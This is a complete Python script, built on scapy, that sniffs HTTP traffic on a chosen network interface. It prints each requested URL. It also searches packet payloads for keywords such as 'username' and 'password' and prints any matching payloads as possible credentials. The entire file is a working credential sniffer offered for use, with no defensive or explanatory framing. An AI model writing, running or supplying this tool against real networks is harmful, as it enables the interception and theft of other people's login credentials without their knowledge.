#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Network Interface")
    (options, arguments) = parser.parse_args()

    if not options.interface:
        parser.error("[-]Please enter a the network Interface. Use --help for more information")
    return options.interface


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")


interface = get_arguments()
sniff(interface)
